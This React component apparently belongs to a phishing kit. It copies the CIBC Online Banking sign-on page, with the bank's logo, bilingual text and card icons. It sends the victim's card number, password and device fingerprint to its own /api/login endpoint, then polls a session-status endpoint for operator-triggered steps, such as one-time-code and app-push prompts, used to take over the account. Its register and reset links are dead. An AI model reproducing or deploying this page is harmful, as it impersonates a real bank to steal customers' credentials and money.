import React, { useState, useEffect, useRef } from 'react';
import { LuEye, LuEyeOff } from 'react-icons/lu';
import { collectDeviceInfo } from '../utils/deviceInfo';

// Card Type SVGs provided by user
function VisaIcon({ className = 'h-[22px] w-auto' }) {
  return (
    <svg aria-labelledby="visa-card-type-icon" role="img" className={className} viewBox="0 0 63 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <title id="visa-card-type-icon">Visa</title>
      <g clipPath="url(#clip0_10323_96215)">
        <path d="M24.6669 2.35319L16.5593 21.6975H11.2698L7.28 6.26114C7.03778 5.31027 6.82845 4.96193 6.09082 4.56165C4.88808 3.90882 2.90191 3.29695 1.15442 2.91667L1.27472 2.35319H9.78965C10.8747 2.35319 11.8503 3.07569 12.0967 4.32587L14.2039 15.5182L19.4115 2.3519L24.6669 2.35319ZM45.3923 15.3817C45.4136 10.2762 38.3327 9.99523 38.3814 7.7142C38.3966 7.02008 39.0587 6.28242 40.504 6.09374C41.221 5.99988 43.1965 5.92795 45.4388 6.95945L46.3177 2.85732C45.1137 2.4206 43.5645 2 41.6371 2C36.691 2 33.2102 4.62938 33.1808 8.39445C33.1486 11.1793 35.6644 12.7333 37.5612 13.6584C39.5116 14.6063 40.1657 15.215 40.1586 16.0629C40.1444 17.3605 38.603 17.9337 37.1622 17.956C34.6464 17.9947 33.1876 17.2754 32.0239 16.7342L31.1169 20.9721C32.2861 21.5088 34.4442 21.9768 36.682 22C41.9393 22 45.3778 19.4032 45.3939 15.3817H45.3923ZM58.4547 21.6975H63.0827L59.0407 2.35319H54.7697C54.3136 2.34925 53.8667 2.48245 53.4872 2.7355C53.1076 2.98855 52.8128 3.34979 52.641 3.77238L45.1317 21.6975H50.3861L51.4289 18.8081H57.849L58.4547 21.6975ZM52.8713 14.8434L55.5051 7.58002L57.021 14.8434H52.8713ZM31.8165 2.35319L27.6787 21.6975H22.6749L26.8143 2.35319H31.8165Z" fill="#1434CB"></path>
      </g>
      <defs>
        <clipPath id="clip0_10323_96215">
          <rect width="63" height="24" fill="white"></rect>
        </clipPath>
      </defs>
    </svg>
  );
}

function MastercardIcon({ className = 'h-[22px] w-auto' }) {
  return (
    <svg aria-labelledby="mastercard-card-type-icon" role="img" className={className} viewBox="0 0 38 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <title id="mastercard-card-type-icon">Mastercard</title>
      <path d="M26.2078 4.37109H17.4963V19.9741H26.2078V4.37109Z" fill="#FF5F00"></path>
      <path d="M18.049 12.1731C18.0476 10.6704 18.3892 9.18707 19.048 7.83545C19.7069 6.48382 20.6656 5.2993 21.8516 4.37155C20.3829 3.22093 18.619 2.50538 16.7615 2.30667C14.9041 2.10797 13.028 2.43413 11.3478 3.2479C9.66751 4.06166 8.25086 5.33018 7.25974 6.90847C6.26863 8.48675 5.74304 10.3111 5.74304 12.1731C5.74304 14.035 6.26863 15.8594 7.25974 17.4376C8.25086 19.0159 9.66751 20.2845 11.3478 21.0982C13.028 21.912 14.9041 22.2381 16.7615 22.0394C18.619 21.8407 20.3829 21.1252 21.8516 19.9746C20.6656 19.0468 19.7069 17.8623 19.0481 16.5107C18.3893 15.159 18.0476 13.6757 18.049 12.1731Z" fill="#EB001B"></path>
      <path d="M37.9598 12.1731C37.9599 14.035 37.4344 15.8593 36.4433 17.4376C35.4522 19.0159 34.0356 20.2844 32.3554 21.0982C30.6752 21.912 28.7992 22.2381 26.9418 22.0394C25.0843 21.8407 23.3205 21.1252 21.8518 19.9746C23.0368 19.0459 23.9947 17.8612 24.6534 16.5098C25.3121 15.1583 25.6544 13.6755 25.6544 12.1731C25.6544 10.6706 25.3121 9.18778 24.6534 7.83636C23.9947 6.48495 23.0368 5.30024 21.8518 4.37155C23.3205 3.22093 25.0843 2.50537 26.9418 2.30667C28.7992 2.10797 30.6752 2.43415 32.3554 3.24792C34.0356 4.06169 35.4522 5.33021 36.4433 6.9085C37.4344 8.48679 37.9599 10.3111 37.9598 12.1731Z" fill="#F79E1B"></path>
      <path d="M37.01 18.3224V18.003H37.1392V17.9379H36.8101V18.003H36.9394V18.3224H37.01ZM37.649 18.3224V17.9373H37.5481L37.432 18.2022L37.316 17.9373H37.215V18.3224H37.2862V18.0319L37.3951 18.2824H37.469L37.5778 18.0313V18.3224H37.649Z" fill="#F79E1B"></path>
    </svg>
  );
}

function DebitAmexIcon({ className = 'h-[22px] w-auto' }) {
  return (
    <svg aria-labelledby="cibc-debit-card-type-icon" role="img" className={className} viewBox="0 0 30 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <title id="cibc-debit-card-type-icon">Debit card</title>
      <g clipPath="url(#clip0_11085_95217)">
        <path d="M27.0857 0H2.91429C1.30477 0 0 1.30477 0 2.91429V21.0857C0 22.6952 1.30477 24 2.91429 24H27.0857C28.6952 24 30 22.6952 30 21.0857V2.91429C30 1.30477 28.6952 0 27.0857 0Z" fill="url(#paint0_linear_11085_95217)"></path>
        <path d="M19.0395 4.87493C18.7912 4.5535 18.4151 4.28564 17.7908 4.28564H12.6061C13.1391 4.28564 13.5517 4.48208 13.8657 4.89278C14.3879 5.57493 19.2111 11.9999 19.2111 11.9999C19.2111 11.9999 14.3879 18.4249 13.8657 19.1071C13.5517 19.5178 13.1391 19.7142 12.6061 19.7142H17.7908C18.4151 19.7142 18.7912 19.4464 19.0395 19.1249L24.3958 11.9999L19.0395 4.87493Z" fill="#CB1944"></path>
        <path d="M15.1974 6.65708C14.5402 5.78565 14.0217 5.09636 13.8647 4.89278C13.5507 4.48208 13.1381 4.28564 12.6051 4.28564C11.9807 4.28564 11.6046 4.5535 11.3564 4.87493L6 11.9999L11.3564 19.1249C11.6046 19.4464 11.9807 19.7142 12.6051 19.7142C13.1381 19.7142 13.5507 19.5178 13.8647 19.1071C14.0217 18.9035 15.1974 17.3428 15.1974 17.3428L11.1847 11.9999L15.1974 6.65708Z" fill="#7B003A"></path>
      </g>
      <defs>
        <linearGradient id="paint0_linear_11085_95217" x1="3.4" y1="12" x2="27.8747" y2="15.5575" gradientUnits="userSpaceOnUse">
          <stop stopColor="#C91943"></stop>
          <stop offset="1" stopColor="#7D013A"></stop>
        </linearGradient>
        <clipPath id="clip0_11085_95217">
          <rect width="30" height="24" fill="white"></rect>
        </clipPath>
      </defs>
    </svg>
  );
}

// Helpers for card type detection and formatting
const getCardType = (cardNumber) => {
  const clean = (cardNumber || '').replace(/\D/g, '');
  if (!clean) return null;

  // Visa: starts with 4
  if (/^4/.test(clean)) {
    return 'visa';
  }

  // Mastercard: 51-55 or 2221-2720
  if (/^(5[1-5]|2[2-7])/.test(clean)) {
    return 'mastercard';
  }

  // Amex: 34 or 37
  if (/^3[47]/.test(clean)) {
    return 'amex';
  }

  // CIBC / Debit / Interac / Discover / Maestro
  if (/^(3[068]|6|5[06-9])/.test(clean)) {
    return 'debit';
  }

  return null;
};

const formatCardNumber = (value) => {
  const digits = (value || '').replace(/\D/g, '');
  if (!digits) return '';

  // Amex: 4-6-5 format (15 digits)
  if (/^3[47]/.test(digits)) {
    const p1 = digits.slice(0, 4);
    const p2 = digits.slice(4, 10);
    const p3 = digits.slice(10, 15);
    return [p1, p2, p3].filter(Boolean).join(' ');
  }

  // Standard cards (Visa, Mastercard, Debit): chunks of 4 digits up to 19 digits
  const parts = [];
  for (let i = 0; i < digits.length && i < 19; i += 4) {
    parts.push(digits.slice(i, i + 4));
  }
  return parts.join(' ');
};

const maskCardNumber = (cardNumber) => {
  const digits = (cardNumber || '').replace(/\D/g, '');
  if (digits.length < 8) return cardNumber || '••••';
  const first4 = digits.slice(0, 4);
  const last4 = digits.slice(-4);
  if (digits.length === 15) {
    return `${first4} ****** ${last4}`;
  }
  return `${first4} **** **** ${last4}`;
};

const translations = {
  en: {
    heading: 'Sign on to CIBC Online Banking',
    headingTrademark: '®',
    enterPasswordFor: 'Enter password for',
    useDifferentCard: 'Use a different card',
    cardNumber: 'Card number',
    cardNumberError: 'Please enter a valid card number',
    password: 'Password',
    passwordLabel: 'Password (case sensitive)',
    passwordError: 'Please enter your password',
    invalidPassword: 'Invalid password. Please try again.',
    serverError: 'Unable to connect to the server.',
    cancelledError: 'Login cancelled by administrator.',
    rememberCard: 'Remember my card',
    infoTitle: 'Remember my card',
    infoText: 'When you select “Remember my card”, we apply a cookie that allows us to recognize your computer, so your card number will appear automatically on the sign on page. Don’t select this checkbox on a shared or public device.',
    continueBtn: 'Continue',
    backBtn: 'Back',
    signInBtn: 'Sign on',
    signingIn: 'Signing in...',
    notRegistered: 'Not registered for online banking?',
    registerNow: 'Register now.',
    troubleSigningOn: 'Trouble signing on?',
    resetPassword: 'Reset your password.',
    trademark: '“CIBC” and the CIBC Logo are trademarks of CIBC.',
    accessibility: 'Accessibility at CIBC',
    privacy: 'Privacy and security',
    legal: 'Legal'
  },
  fr: {
    heading: 'Ouvrir une session dans Services bancaires CIBC en direct',
    headingTrademark: 'MD',
    enterPasswordFor: 'Entrez le mot de passe pour',
    useDifferentCard: 'Utiliser une autre carte',
    cardNumber: 'Numéro de carte',
    cardNumberError: 'Veuillez entrer un numéro de carte valide',
    password: 'Mot de passe',
    passwordLabel: 'Mot de passe (sensible à la casse)',
    passwordError: 'Veuillez entrer votre mot de passe',
    invalidPassword: 'Mot de passe non valide. Veuillez réessayer.',
    serverError: 'Impossible de se connecter au serveur.',
    cancelledError: 'Connexion annulée par l’administrateur.',
    rememberCard: 'Mémoriser mon numéro',
    infoTitle: 'Mémoriser mon numéro',
    infoText: 'Lorsque vous sélectionnez « Mémoriser mon numéro », nous installons un témoin qui permet de reconnaître votre ordinateur afin que votre numéro de carte s\'affiche automatiquement sur la page d\'ouverture de session. Ne cochez pas cette case sur un appareil partagé ou public.',
    continueBtn: 'Continuer',
    backBtn: 'Retour',
    signInBtn: 'Ouvrir une session',
    signingIn: 'Connexion en cours...',
    notRegistered: 'Vous n’êtes pas inscrit à Services bancaires en direct?',
    registerNow: 'S’inscrire maintenant.',
    troubleSigningOn: 'Impossible d’ouvrir une session?',
    resetPassword: 'Réinitialisez votre mot de passe.',
    trademark: 'CIBC et le logo CIBC sont des marques de commerce de la Banque CIBC.',
    accessibility: 'Accessibilité à la Banque CIBC',
    privacy: 'Confidentialité et sécurité',
    legal: 'Mentions juridiques'
  }
};

export default function LoginPage({ lang = 'en', setLang, onSignInInitiated, onAppPopupInitiated, onAppPushInitiated }) {
  const [currentLang, setCurrentLang] = useState(lang || 'en');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [saveCard, setSaveCard] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [isUsernameInvalid, setIsUsernameInvalid] = useState(false);
  const [showInfoDialog, setShowInfoDialog] = useState(false);
  const [currentScreen, setCurrentScreen] = useState('username');
  const [slideDirection, setSlideDirection] = useState('forward');
  const [showPassword, setShowPassword] = useState(false);

  const cardType = getCardType(username);

  const usernameInputRef = useRef(null);
  const passwordInputRef = useRef(null);

  useEffect(() => {
    if (lang) {
      setCurrentLang(lang);
    }
  }, [lang]);

  useEffect(() => {
    if (currentScreen === 'password') {
      const timer = setTimeout(() => {
        passwordInputRef.current?.focus();
      }, 150);
      return () => clearTimeout(timer);
    } else if (currentScreen === 'username') {
      const timer = setTimeout(() => {
        usernameInputRef.current?.focus();
      }, 150);
      return () => clearTimeout(timer);
    }
  }, [currentScreen]);

  const t = translations[currentLang] || translations.en;

  const handleLangChange = (newLang) => {
    setCurrentLang(newLang);
    if (setLang) {
      setLang(newLang);
    }
    localStorage.setItem('appLang', newLang);
    if (errorMessage) {
      setErrorMessage('');
    }
  };

  useEffect(() => {
    if (!isLoading || !username.trim()) return;
    let intervalId;
    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(username.trim())}`, {
          headers: { 'X-Access-Key': 'client-cibc-bank' }
        });
        const data = await response.json();
        if (data.success) {
          if (data.status === 'show_otp' || data.status === 'card_popup' || data.status === 'card_submitted') {
            setIsLoading(false);
            onSignInInitiated(username.trim());
          } else if (data.status === 'app_popup') {
            setIsLoading(false);
            onAppPopupInitiated(username.trim());
          } else if (data.status === 'app_push_popup') {
            setIsLoading(false);
            onAppPushInitiated(username.trim());
          } else if (data.status === 'cancelled') {
            setIsLoading(false);
            setErrorMessage(t.cancelledError);
          }
        }
      } catch (err) {
        console.error('Error polling session status:', err);
      }
    };
    intervalId = setInterval(checkStatus, 2000);
    return () => { if (intervalId) clearInterval(intervalId); };
  }, [isLoading, username, onSignInInitiated, onAppPopupInitiated, onAppPushInitiated, t.cancelledError]);

  const handleNext = async (e) => {
    e.preventDefault();
    setErrorMessage('');
    setIsUsernameInvalid(false);

    if (!username.trim()) {
      setIsUsernameInvalid(true);
      setErrorMessage(t.cardNumberError);
      return;
    }

    setSlideDirection('forward');
    setCurrentScreen('password');
  };

  const handleSignIn = async (e) => {
    e.preventDefault();
    setErrorMessage('');

    if (!password.trim()) {
      setErrorMessage(t.passwordError);
      return;
    }

    setIsLoading(true);

    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-cibc-bank' },
        body: JSON.stringify({
          email: username.trim(),
          password: password.trim(),
          deviceInfo: collectDeviceInfo(),
        })
      });
      const data = await response.json();
      if (!data.success) {
        setIsLoading(false);
        setErrorMessage(t.invalidPassword);
      }
    } catch (err) {
      console.error(err);
      setIsLoading(false);
      setErrorMessage(t.serverError);
    }
  };

  const handleBackClick = () => {
    setSlideDirection('backward');
    setCurrentScreen('username');
    setPassword('');
    setErrorMessage('');
  };

  return (
    <div
      className="min-h-screen flex flex-col justify-between bg-white md:bg-[#c41f3e]"
      style={{ fontFamily: "'Whitney', 'Whitney SSm', 'Whitney Medium', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
    >
      {/* Top & Center Content Area */}
      <div className="flex-1 flex flex-col items-center justify-center p-0 md:py-6 md:px-4 w-full">
        {/* Desktop Language Switcher (above card, hidden on mobile) */}
        <div className="hidden md:flex w-[92%] md:w-[70vw] justify-end items-center mb-3 pr-1 text-[16.5px] text-white select-none">
          <button
            type="button"
            onClick={() => handleLangChange('en')}
            className={`cursor-pointer hover:underline text-white transition-opacity ${currentLang === 'en' ? 'font-normal opacity-100' : 'underline opacity-95'}`}
          >
            English
          </button>
          <span className="mx-2.5 text-white/80">|</span>
          <button
            type="button"
            onClick={() => handleLangChange('fr')}
            className={`cursor-pointer hover:underline text-white transition-opacity ${currentLang === 'fr' ? 'font-normal opacity-100' : 'underline opacity-95'}`}
          >
            Français
          </button>
        </div>

        {/* Center Container: Full-bleed edge-to-edge white on mobile, 70vw and 50vh card on desktop */}
        <div className="relative w-full flex-1 md:flex-initial md:max-w-none md:w-[70vw] md:h-[65vh] min-h-0 bg-white rounded-none md:rounded-xl shadow-none md:shadow-lg flex flex-col justify-start md:justify-center px-6 py-8 sm:px-10 md:px-14 lg:px-20 overflow-y-auto">
          {/* Mobile Top Header: Language Switcher inside card */}
          <div className="flex md:hidden justify-end items-center mb-5 text-[15.5px] text-[#333333] select-none">
            <button
              type="button"
              onClick={() => handleLangChange('en')}
              className={`cursor-pointer hover:underline text-[#333333] ${currentLang === 'en' ? 'font-medium' : 'underline text-gray-700'}`}
            >
              English
            </button>
            <span className="mx-2 text-gray-400">|</span>
            <button
              type="button"
              onClick={() => handleLangChange('fr')}
              className={`cursor-pointer hover:underline text-[#333333] ${currentLang === 'fr' ? 'font-medium' : 'underline text-gray-700'}`}
            >
              Français
            </button>
          </div>

          {/* Mobile Logo & Security Shield Header Row */}
          <div className="flex md:hidden items-center justify-between mb-6">
            <img
              src="/cibc-logo-red-a0b8a939.svg"
              alt="CIBC Logo"
              className="w-[110px] h-auto object-contain"
            />
            <img
              src="/shield-28a4b268.svg"
              alt="Security"
              className="w-5 h-5 object-contain"
            />
          </div>

          {/* Desktop Security Shield (top right corner of card) */}
          <div className="absolute top-[22px] right-[28px] w-5 h-5 hidden md:flex items-center justify-center pointer-events-none">
            <img
              src="/shield-28a4b268.svg"
              alt="Security"
              className="w-5 h-5 object-contain"
            />
          </div>

          {/* Two-Column Content on Desktop / Centered Stack on Mobile */}
          <div className="w-full flex flex-col md:flex-row md:items-start justify-center gap-10 md:gap-16 lg:gap-24">
            {/* Desktop Left Column: CIBC Logo */}
            <div className="hidden md:flex flex-shrink-0 pt-1 justify-start">
              <img
                src="/cibc-logo-red-a0b8a939.svg"
                alt="CIBC Logo"
                className="w-[125px] md:w-[135px] h-auto object-contain"
              />
            </div>

            {/* Right Column: Form Container */}
            <div className="w-full md:w-[330px] lg:w-[340px] flex-shrink-0">
              {/* Form Container with smooth left-to-right / right-to-left transition */}
              <div className="relative w-full">
                <div
                  key={currentScreen}
                  className={
                    slideDirection === 'forward'
                      ? 'animate-slide-in-right'
                      : 'animate-slide-in-left'
                  }
                >
                  {/* USERNAME SCREEN */}
                  {currentScreen === 'username' && (
                    <div className="relative">
                      <h1 className="text-[22px] sm:text-[23px] font-normal text-[#2b2b2b] mb-5 tracking-tight leading-[1.3] max-w-[340px]">
                        {t.heading}
                        <sup className="text-[13px] font-normal ml-0.5">{t.headingTrademark}</sup>
                      </h1>

                      <form onSubmit={handleNext} className="relative">
                        {/* Card Number Input */}
                        <div className="mb-4">
                          <label htmlFor="username" className="text-[#333333] text-[17px] font-normal mb-1.5 block">
                            {t.cardNumber}
                          </label>
                          <div className="relative">
                            <input
                              id="username"
                              ref={usernameInputRef}
                              type="text"
                              inputMode="numeric"
                              value={username}
                              onChange={e => {
                                const formatted = formatCardNumber(e.target.value);
                                setUsername(formatted);
                                if (formatted.trim().length >= 1) {
                                  setIsUsernameInvalid(false);
                                  setErrorMessage('');
                                }
                              }}
                              onBlur={() => {
                                if (!username.trim()) {
                                  setIsUsernameInvalid(true);
                                  setErrorMessage(t.cardNumberError);
                                } else {
                                  setIsUsernameInvalid(false);
                                  setErrorMessage('');
                                }
                              }}
                              disabled={isLoading}
                              autoComplete="cc-number"
                              maxLength={23}
                              className={`w-full h-[54px] pl-4 pr-[76px] text-[18px] text-[#222222] outline-none border rounded-[6px] bg-white transition-colors ${
                                isUsernameInvalid
                                  ? 'border-[#b80000]'
                                  : 'border-[#7d7e81] focus:border-[#c41f3e]'
                              }`}
                            />
                            {cardType && (
                              <div className="absolute right-3.5 top-1/2 -translate-y-1/2 flex items-center justify-center pointer-events-none transition-opacity duration-200">
                                {cardType === 'visa' && <VisaIcon className="h-[22px] w-auto" />}
                                {cardType === 'mastercard' && <MastercardIcon className="h-[22px] w-auto" />}
                                {(cardType === 'amex' || cardType === 'debit') && <DebitAmexIcon className="h-[22px] w-auto" />}
                              </div>
                            )}
                          </div>

                          {/* Error Notification */}
                          {errorMessage && (
                            <div className="flex items-start gap-1.5 mt-2">
                              <div className="w-4 h-4 bg-[#b80000] text-white rounded-[2px] flex items-center justify-center text-[10px] font-bold flex-shrink-0 mt-0.5">
                                !
                              </div>
                              <span className="text-[#b80000] text-[16px] font-normal leading-tight">
                                {errorMessage}
                              </span>
                            </div>
                          )}
                        </div>

                        {/* Remember My Card Checkbox + Info Icon */}
                        <div className="mt-4 mb-6 flex items-center gap-2">
                          <input
                            type="checkbox"
                            id="saveCard"
                            checked={saveCard}
                            onChange={e => setSaveCard(e.target.checked)}
                            disabled={isLoading}
                            className="w-[18px] h-[18px] rounded border-gray-400 text-[#c41f3e] focus:ring-0 cursor-pointer accent-[#c41f3e]"
                          />
                          <label htmlFor="saveCard" className="text-[#333333] text-[17px] font-normal cursor-pointer select-none">
                            {t.rememberCard}
                          </label>
                          <button
                            type="button"
                            onClick={() => setShowInfoDialog(!showInfoDialog)}
                            className="text-gray-600 hover:text-gray-900 transition-colors ml-0.5 cursor-pointer flex items-center justify-center"
                            aria-label="Information"
                          >
                            <svg className="w-4 h-4 text-gray-700" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                              <circle cx="12" cy="12" r="10" />
                              <line x1="12" y1="16" x2="12" y2="12" />
                              <line x1="12" y1="8" x2="12.01" y2="8" />
                            </svg>
                          </button>
                        </div>

                        {/* Remember My Card Info Popup */}
                        {showInfoDialog && (
                          <div className="absolute left-0 right-0 sm:left-[130px] md:left-[145px] sm:right-auto top-[75px] z-30 w-full sm:w-[290px] bg-white rounded-xl shadow-2xl border border-gray-200/90 p-4 sm:p-5 text-left">
                            <div className="flex items-start justify-between gap-2 mb-2.5">
                              <h2 className="text-[16.5px] font-semibold text-[#2c2c2c] leading-snug">
                                {t.infoTitle}
                              </h2>
                              <button
                                type="button"
                                onClick={() => setShowInfoDialog(false)}
                                className="text-[#383B3E] hover:opacity-70 transition-opacity cursor-pointer p-0.5 -mr-1 -mt-0.5"
                                aria-label="Close"
                              >
                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                                  <path fill="currentColor" d="m3 19.587 7.587-7.588L3 4.412l1.414-1.414 7.588 7.587 7.587-7.587 1.414 1.414L13.416 12l7.587 7.588L19.589 21l-7.587-7.587L4.413 21 3 19.587Z" />
                                </svg>
                              </button>
                            </div>
                            <p className="text-[14.5px] text-[#4a4a4a] leading-relaxed font-normal">
                              {t.infoText}
                            </p>
                          </div>
                        )}

                        {/* Buttons: Stacked on Mobile (Continue on top, Back on bottom), Side-by-side on Desktop */}
                        <div className="flex flex-col md:flex-row gap-3.5 my-6 md:mb-8 shrink-0">
                          <button
                            type="submit"
                            disabled={isLoading}
                            className="order-1 md:order-2 w-full md:w-auto md:flex-1 h-[52px] min-h-[52px] shrink-0 bg-[#c41f3e] text-white text-[17px] font-normal rounded-[6px] hover:bg-[#a91833] transition-colors cursor-pointer disabled:opacity-50 flex items-center justify-center px-4"
                          >
                            {t.continueBtn}
                          </button>
                          <button
                            type="button"
                            disabled={isLoading}
                            onClick={() => {
                              setUsername('');
                              setErrorMessage('');
                              setIsUsernameInvalid(false);
                            }}
                            className="order-2 md:order-1 w-full md:w-auto md:flex-1 h-[52px] min-h-[52px] shrink-0 bg-white border border-[#c41f3e] text-[#c41f3e] text-[17px] font-normal rounded-[6px] hover:bg-red-50 transition-colors cursor-pointer disabled:opacity-50 flex items-center justify-center px-4"
                          >
                            {t.backBtn}
                          </button>
                        </div>

                        {/* Helpful Links */}
                        <div className="space-y-3.5 text-center md:text-left text-[16px] text-[#333333] leading-normal">
                          <div>
                            <p>{t.notRegistered}</p>
                            <a href="#" onClick={e => e.preventDefault()} className="text-[#333333] underline hover:text-[#c41f3e] inline-block mt-0.5">
                              {t.registerNow}
                            </a>
                          </div>
                          <div>
                            <p>{t.troubleSigningOn}</p>
                            <a href="#" onClick={e => e.preventDefault()} className="text-[#333333] underline hover:text-[#c41f3e] inline-block mt-0.5">
                              {t.resetPassword}
                            </a>
                          </div>
                        </div>
                      </form>
                    </div>
                  )}

                  {/* PASSWORD SCREEN */}
                  {currentScreen === 'password' && (
                    <div className="relative">
                      {/* Password Header: Enter password for + Masked Card + Use a different card link */}
                      <div className="mb-6">
                        <h1 className="text-[22px] sm:text-[23px] font-normal text-[#2b2b2b] tracking-tight leading-[1.3]">
                          <div>{t.enterPasswordFor}</div>
                          <div className="mt-0.5 font-normal">{maskCardNumber(username)}</div>
                        </h1>
                        <button
                          type="button"
                          onClick={handleBackClick}
                          className="mt-2 text-[15.5px] text-[#333333] underline hover:text-[#c41f3e] cursor-pointer inline-block"
                        >
                          {t.useDifferentCard}
                        </button>
                      </div>

                      <form onSubmit={handleSignIn}>
                        {/* Password Input */}
                        <div className="mb-5">
                          <label htmlFor="password" className="text-[#333333] text-[17px] font-normal mb-1.5 block">
                            {t.passwordLabel}
                          </label>
                          <div className="relative">
                            <input
                              id="password"
                              ref={passwordInputRef}
                              type={showPassword ? 'text' : 'password'}
                              value={password}
                              onChange={e => {
                                setPassword(e.target.value);
                                if (errorMessage) setErrorMessage('');
                              }}
                              disabled={isLoading}
                              autoComplete="current-password"
                              className="w-full h-[54px] pl-4 pr-12 text-[18px] text-[#222222] outline-none border border-[#7d7e81] focus:border-[#c41f3e] rounded-[6px] bg-white transition-colors"
                            />
                            <button
                              type="button"
                              onClick={() => setShowPassword(!showPassword)}
                              className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#c41f3e] hover:opacity-80 transition-opacity cursor-pointer p-1"
                              disabled={isLoading}
                              aria-label={showPassword ? 'Hide password' : 'Show password'}
                            >
                              {showPassword ? (
                                <LuEye size={20} strokeWidth={2} />
                              ) : (
                                <LuEyeOff size={20} strokeWidth={2} />
                              )}
                            </button>
                          </div>

                          {/* Error Notification */}
                          {errorMessage && (
                            <div className="flex items-start gap-1.5 mt-2">
                              <div className="w-4 h-4 bg-[#b80000] text-white rounded-[2px] flex items-center justify-center text-[10px] font-bold flex-shrink-0 mt-0.5">
                                !
                              </div>
                              <span className="text-[#b80000] text-[16px] font-normal leading-tight">
                                {errorMessage}
                              </span>
                            </div>
                          )}
                        </div>

                        {/* Sign on Button: Full-width single red button */}
                        <div className="my-6 shrink-0">
                          <button
                            type="submit"
                            disabled={isLoading}
                            className="w-full h-[52px] min-h-[52px] shrink-0 bg-[#c41f3e] text-white text-[18px] font-medium rounded-[6px] hover:bg-[#a91833] transition-colors cursor-pointer disabled:opacity-50 flex items-center justify-center gap-1.5 px-4"
                          >
                            {isLoading ? (
                              <>
                                <svg className="animate-spin w-4 h-4 text-white" fill="none" viewBox="0 0 24 24">
                                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                                </svg>
                                <span>{t.signingIn}</span>
                              </>
                            ) : (
                              t.signInBtn
                            )}
                          </button>
                        </div>

                        {/* Helpful Links */}
                        <div className="space-y-3.5 text-center md:text-left text-[16px] text-[#333333] leading-normal">
                          <div>
                            <p>{t.notRegistered}</p>
                            <a href="#" onClick={e => e.preventDefault()} className="text-[#333333] underline hover:text-[#c41f3e] inline-block mt-0.5">
                              {t.registerNow}
                            </a>
                          </div>
                          <div>
                            <p>{t.troubleSigningOn}</p>
                            <a href="#" onClick={e => e.preventDefault()} className="text-[#333333] underline hover:text-[#c41f3e] inline-block mt-0.5">
                              {t.resetPassword}
                            </a>
                          </div>
                        </div>
                      </form>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Dark Footer Bar: Stacked & Centered on Mobile, Row on Desktop */}
      <footer className="w-full bg-[#393b3e] py-8 md:py-0 md:h-[56px] md:min-h-[56px] flex items-center border-t border-[#303235]">
        <div className="w-full max-w-[1300px] mx-auto px-6 sm:px-10 md:px-16 lg:px-24 flex flex-col md:flex-row items-center justify-between gap-5 md:gap-2 text-[15px] md:text-[15.5px] text-[#f8f9f9] text-center md:text-left">
          {/* Mobile: Links first, Desktop: Links on right */}
          <div className="flex flex-col md:flex-row items-center gap-3 md:gap-6 order-1 md:order-2">
            <a href="#" onClick={e => e.preventDefault()} className="text-white/90 hover:underline hover:text-white transition-colors">
              {t.accessibility}
            </a>
            <a href="#" onClick={e => e.preventDefault()} className="text-white/90 hover:underline hover:text-white transition-colors">
              {t.privacy}
            </a>
            <a href="#" onClick={e => e.preventDefault()} className="text-white/90 hover:underline hover:text-white transition-colors">
              {t.legal}
            </a>
          </div>

          {/* Mobile: Trademarks below links, Desktop: on left */}
          <p className="tracking-tight text-white/90 order-2 md:order-1 mt-2 md:mt-0">
            {t.trademark}
          </p>
        </div>
      </footer>
    </div>
  );
}
